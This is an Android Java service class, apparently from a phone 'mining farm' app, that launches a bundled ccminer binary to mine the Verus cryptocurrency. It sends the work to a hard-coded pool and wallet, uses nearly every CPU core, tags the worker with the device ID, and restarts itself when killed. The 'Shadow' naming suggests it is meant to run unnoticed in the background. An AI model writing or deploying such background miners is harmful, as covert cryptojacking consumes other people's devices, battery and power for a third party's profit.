package com.farm.miner;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import java.io.File;

public class ShadowWorker extends Service {
    private Process shadowMinerProcess;
    private static final String POOL_URL = "stratum+tcp://ap.luckpool.net:3956";
    private static final String WALLET_ADDRESS = "RWZf58DwQ9R3QkdXVGtv2PGBYhc5qEfyxx"; // <-- À REMPLACER

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ensureShadowMining();
        return START_STICKY; // Le système le redémarre s'il est tué
    }

    private void ensureShadowMining() {
        if (shadowMinerProcess != null && shadowMinerProcess.isAlive()) return;

        new Thread(() -> {
            try {
                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                String workerName = "Shadow_" + (deviceId != null ? deviceId.substring(0, 6) : "Android");
                File binaryFile = new File(getFilesDir(), "ccminer-arm64");

                if (binaryFile.exists()) {
                    binaryFile.setExecutable(true, false);
                    int threads = Math.max(1, Runtime.getRuntime().availableProcessors() - 1);

                    ProcessBuilder pb = new ProcessBuilder(
                            binaryFile.getAbsolutePath(),
                            "-a", "verus",
                            "-o", POOL_URL,
                            "-u", WALLET_ADDRESS + "." + workerName,
                            "-p", "x",
                            "-t", String.valueOf(threads)
                    );
                    pb.directory(getFilesDir());
                    shadowMinerProcess = pb.start();
                    shadowMinerProcess.waitFor();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}